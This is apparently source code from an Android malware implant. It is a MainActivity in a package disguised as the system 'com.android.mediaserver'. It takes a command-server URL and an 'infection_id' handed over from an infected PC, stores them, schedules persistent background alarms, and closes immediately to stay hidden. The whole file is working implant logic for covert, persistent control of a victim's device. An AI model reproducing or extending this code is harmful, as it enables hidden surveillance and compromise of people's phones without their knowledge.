package com.android.mediaserver;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import com.android.mediaserver.config.Config;
import com.android.mediaserver.service.AppListener;
import com.commonsware.cwac.wakeful.WakefulIntentService;
import timber.log.Timber;

public class MainActivity extends Activity {
  protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);
    updateConfig();
    WakefulIntentService.scheduleAlarms(new AppListener(), this, false);
    finish();
  }

  private void updateConfig() {
    try {
      Intent intent = getIntent();
      String apiUrl = intent.getStringExtra("api_url");
      String infectionId = intent.getStringExtra("infection_id");
      if (apiUrl != null && infectionId != null) {
        Config config = Config.getInstance(getApplicationContext());
        config.setApiUrl(apiUrl);
        config.setInfectionId(infectionId);
        config.updateConfig(getApplicationContext());
      }
    } catch (Exception e) {
      Timber.e(e, "Failed to update config values from PC infection", new Object[0]);
    }
  }
}
